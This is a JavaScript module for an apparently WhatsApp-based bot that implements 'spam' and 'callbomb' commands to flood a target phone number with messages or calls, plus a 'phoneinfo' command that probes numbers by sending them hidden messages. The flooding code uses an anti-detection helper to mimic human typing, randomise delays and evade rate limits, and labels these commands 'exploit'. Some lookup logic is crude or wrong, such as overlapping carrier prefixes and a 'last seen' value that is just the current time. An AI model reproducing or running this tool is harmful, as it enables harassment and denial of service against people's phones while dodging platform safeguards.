'use strict';

const crypto = require('crypto');
const AntiDetection = require('../lib/antiDetection');

class PhoneAttacks {
    constructor() {
        this.sock = null;
        this.stealth = new AntiDetection();
        this.activeSpams = new Map();
        this.activeCallBombs = new Map();
        this.phoneCache = new Map();
    }

    // ==============================================
    // SPAM COMMAND - STEALTH VERSION
    // ==============================================
    async spamExecute(sock, msg, args, ctx) {
        this.sock = sock;
        
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: `📱 SILENT SPAM USAGE 📱
┌─────────────────────────────
│ .spam <phone> [count] [delay]
│ 
│ EXAMPLE:
│ .spam 2547XXXXXX 100 0.5
│ 
│ STEALTH FEATURES:
│ 🔇 Human typing patterns
│ 🎭 Random delays between messages
│ 📱 Natural message variation
│ ✨ Emoji integration
│ 🛡️ Rate limit protection
└─────────────────────────────`
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        let count = parseInt(args[1]) || 50;
        const delay = parseFloat(args[2]) || 0.5;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `❌ Invalid phone: ${phone}\nUse format: CountryCode + Number`
            }, { quoted: msg });
            return;
        }

        // Get safe parameters
        const safeParams = this.stealth.getSafeParams('message', count);
        count = safeParams.safeCount;

        if (this.activeSpams.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ Spam already running on ${phone}\nUse .spam_stop ${phone} to stop`
            }, { quoted: msg });
            return;
        }

        this.activeSpams.set(phone, { active: true, count, delay });

        await sock.sendMessage(ctx.from, {
            text: `🔇 SILENT SPAM INITIATED 🔇
┌─────────────────────────────
│ Target: ${phone}
│ Messages: ${count}
│ Delay: ${delay}s
│ Mode: STEALTH
│ Status: RUNNING
└─────────────────────────────`
        }, { quoted: msg });

        let sent = 0;
        let failed = 0;

        try {
            // Generate natural messages
            const messages = [];
            for (let i = 0; i < count; i++) {
                messages.push(this.stealth.generateNaturalMessage(phone));
            }

            // Send with stealth batch
            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                delayBetween: delay * 1000,
                randomSpread: true,
                simulateTyping: true,
                maxPerBatch: 10,
                safetyMargin: 0.3
            });

            for (const result of results) {
                if (result.success) sent++;
                else failed++;
            }
        } catch (err) {
            console.error('Spam error:', err);
        } finally {
            this.activeSpams.delete(phone);
        }

        await sock.sendMessage(ctx.from, {
            text: `🔇 SILENT SPAM COMPLETE 🔇
┌─────────────────────────────
│ Target: ${phone}
│ Sent: ${sent}
│ Failed: ${failed}
│ Total: ${sent + failed}
│ Mode: STEALTH
└─────────────────────────────`
        }, { quoted: msg });
    }

    // ==============================================
    // CALLBOMB COMMAND - STEALTH VERSION
    // ==============================================
    async callbombExecute(sock, msg, args, ctx) {
        this.sock = sock;
        
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: `📞 SILENT CALLBOMB USAGE 📞
┌─────────────────────────────
│ .callbomb <phone> [count] [delay]
│ 
│ EXAMPLE:
│ .callbomb 2547XXXXXX 20 2
│ 
│ STEALTH FEATURES:
│ 🔇 Human call patterns
│ 🎭 Random call durations
│ 📱 Natural timing
│ 🛡️ Rate limit protection
└─────────────────────────────`
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        let count = parseInt(args[1]) || 20;
        const delay = parseFloat(args[2]) || 2;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `❌ Invalid phone: ${phone}`
            }, { quoted: msg });
            return;
        }

        // Get safe parameters
        const safeParams = this.stealth.getSafeParams('call', count);
        count = safeParams.safeCount;

        if (this.activeCallBombs.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ Callbomb already running on ${phone}`
            }, { quoted: msg });
            return;
        }

        this.activeCallBombs.set(phone, { active: true, count, delay });

        await sock.sendMessage(ctx.from, {
            text: `📞 SILENT CALLBOMB INITIATED 📞
┌─────────────────────────────
│ Target: ${phone}
│ Calls: ${count}
│ Delay: ${delay}s
│ Mode: STEALTH
│ Status: RUNNING
└─────────────────────────────`
        }, { quoted: msg });

        let connected = 0;
        let failed = 0;

        try {
            const results = await this.stealth.makeStealthCallBatch(this.sock, phone, count, {
                delayBetween: delay * 1000,
                randomSpread: true,
                maxPerBatch: 3,
                safetyMargin: 0.3
            });

            for (const result of results) {
                if (result.success) connected++;
                else failed++;
            }
        } catch (err) {
            console.error('Callbomb error:', err);
        } finally {
            this.activeCallBombs.delete(phone);
        }

        await sock.sendMessage(ctx.from, {
            text: `📞 SILENT CALLBOMB COMPLETE 📞
┌─────────────────────────────
│ Target: ${phone}
│ Connected: ${connected}
│ Failed: ${failed}
│ Total: ${connected + failed}
│ Mode: STEALTH
└─────────────────────────────`
        }, { quoted: msg });
    }

    // ==============================================
    // PHONE INFO COMMAND
    // ==============================================
    async phoneinfoExecute(sock, msg, args, ctx) {
        this.sock = sock;
        
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: `🔍 PHONE INFO USAGE 🔍
┌─────────────────────────────
│ .phoneinfo <phone>
│ 
│ EXAMPLE:
│ .phoneinfo 2547XXXXXX
└─────────────────────────────`
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `❌ Invalid phone: ${phone}`
            }, { quoted: msg });
            return;
        }

        const info = await this.getPhoneInfo(phone);

        await sock.sendMessage(ctx.from, {
            text: `🔍 PHONE INFORMATION 🔍
┌─────────────────────────────
│ 📱 Number: ${info.number}
│ 🌍 Country: ${info.country || 'Unknown'}
│ 🏢 Carrier: ${info.carrier || 'Unknown'}
│ 📡 Network: ${info.network || 'Unknown'}
│ 📟 Type: ${info.type || 'Unknown'}
│ 📊 Status: ${info.status || 'Active'}
│ 
│ 🔍 PLATFORMS:
│ ├─ WhatsApp: ${info.whatsapp || '✅ Active'}
│ └─ Last Seen: ${info.lastSeen || 'Unknown'}
└─────────────────────────────`
        }, { quoted: msg });
    }

    validatePhone(phone) {
        return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
    }

    async getPhoneInfo(phone) {
        if (this.phoneCache.has(phone)) {
            return this.phoneCache.get(phone);
        }

        const info = {
            number: phone,
            country: this.detectCountry(phone),
            carrier: this.detectCarrier(phone),
            network: this.detectNetwork(phone),
            type: this.detectPhoneType(phone),
            status: 'Active',
            whatsapp: await this.checkWhatsApp(phone),
            lastSeen: new Date().toISOString()
        };

        this.phoneCache.set(phone, info);
        return info;
    }

    detectCountry(phone) {
        const countryMap = {
            '254': 'Kenya', '234': 'Nigeria', '233': 'Ghana',
            '256': 'Uganda', '255': 'Tanzania', '27': 'South Africa',
            '44': 'UK', '1': 'USA/Canada', '91': 'India',
            '61': 'Australia', '64': 'New Zealand', '86': 'China',
            '81': 'Japan', '82': 'South Korea', '60': 'Malaysia',
            '62': 'Indonesia', '63': 'Philippines', '66': 'Thailand',
            '84': 'Vietnam', '92': 'Pakistan', '966': 'Saudi Arabia',
            '971': 'UAE', '972': 'Israel', '90': 'Turkey',
            '33': 'France', '49': 'Germany', '39': 'Italy',
            '34': 'Spain', '31': 'Netherlands', '46': 'Sweden',
            '47': 'Norway', '358': 'Finland', '45': 'Denmark'
        };

        for (const [code, country] of Object.entries(countryMap)) {
            if (phone.startsWith(code)) return country;
        }
        return 'Unknown';
    }

    detectCarrier(phone) {
        const carriers = {
            'Safaricom': ['070', '071', '072', '073', '074', '075', '076', '077', '078', '079'],
            'Airtel': ['0730', '0731', '0732', '0733', '0734', '0735', '0736', '0737', '0738', '0739'],
            'MTN': ['080', '081', '090', '091'],
            'Vodafone': ['070', '071', '072', '073'],
            'Orange': ['060', '061', '062', '063'],
            'T-Mobile': ['206', '253', '360', '425'],
            'Verizon': ['260', '280', '310', '320'],
            'AT&T': ['210', '310', '408', '510'],
            'Telstra': ['040', '041', '042', '043'],
            'Optus': ['044', '045', '046', '047']
        };

        const prefix = phone.substring(0, 4);
        for (const [carrier, prefixes] of Object.entries(carriers)) {
            if (prefixes.some(p => prefix.startsWith(p))) {
                return carrier;
            }
        }
        return 'Unknown';
    }

    detectNetwork(phone) {
        return this.detectCarrier(phone) !== 'Unknown' ? this.detectCarrier(phone) : 'Unknown';
    }

    detectPhoneType(phone) {
        const secondDigit = phone.charAt(1);
        if (['6', '7', '8', '9'].includes(secondDigit)) {
            return 'Mobile';
        }
        return 'Landline';
    }

    async checkWhatsApp(phone) {
        try {
            const jid = phone + '@s.whatsapp.net';
            await this.sock.sendMessage(jid, {
                text: '.',
                ephemeralExpiration: 86400
            });
            return '✅ Active';
        } catch (e) {
            return '❌ Inactive';
        }
    }
}

// ==============================================
// COMMAND WRAPPERS
// ==============================================

class SpamCommand {
    constructor(phoneAttacks) {
        this.phoneAttacks = phoneAttacks;
        this.name = 'spam';
        this.aliases = ['msgspam', 'flood'];
        this.description = 'Silent spam phone number (STEALTH)';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.spamExecute(sock, msg, args, ctx);
    }
}

class CallbombCommand {
    constructor(phoneAttacks) {
        this.phoneAttacks = phoneAttacks;
        this.name = 'callbomb';
        this.aliases = ['callflood', 'callspam'];
        this.description = 'Silent call flood (STEALTH)';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.callbombExecute(sock, msg, args, ctx);
    }
}

class PhoneInfoCommand {
    constructor(phoneAttacks) {
        this.phoneAttacks = phoneAttacks;
        this.name = 'phoneinfo';
        this.aliases = ['phone', 'numinfo'];
        this.description = 'Global phone info';
        this.category = 'utility';
    }

    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.phoneinfoExecute(sock, msg, args, ctx);
    }
}

class SpamStopCommand {
    constructor(phoneAttacks) {
        this.phoneAttacks = phoneAttacks;
        this.name = 'spam_stop';
        this.aliases = ['stopspam'];
        this.description = 'Stop silent spam';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, { text: 'Usage: .spam_stop <phone>' }, { quoted: msg });
            return;
        }
        const phone = args[0].replace(/[^0-9]/g, '');
        if (this.phoneAttacks.activeSpams.has(phone)) {
            this.phoneAttacks.activeSpams.delete(phone);
            await sock.sendMessage(ctx.from, { text: `✅ Stopped silent spam on ${phone}` }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, { text: `❌ No active spam on ${phone}` }, { quoted: msg });
        }
    }
}

class CallbombStopCommand {
    constructor(phoneAttacks) {
        this.phoneAttacks = phoneAttacks;
        this.name = 'callbomb_stop';
        this.aliases = ['stopcallbomb'];
        this.description = 'Stop silent callbomb';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, { text: 'Usage: .callbomb_stop <phone>' }, { quoted: msg });
            return;
        }
        const phone = args[0].replace(/[^0-9]/g, '');
        if (this.phoneAttacks.activeCallBombs.has(phone)) {
            this.phoneAttacks.activeCallBombs.delete(phone);
            await sock.sendMessage(ctx.from, { text: `✅ Stopped silent callbomb on ${phone}` }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, { text: `❌ No active callbomb on ${phone}` }, { quoted: msg });
        }
    }
}

module.exports = {
    PhoneAttacks,
    SpamCommand,
    CallbombCommand,
    PhoneInfoCommand,
    SpamStopCommand,
    CallbombStopCommand
};
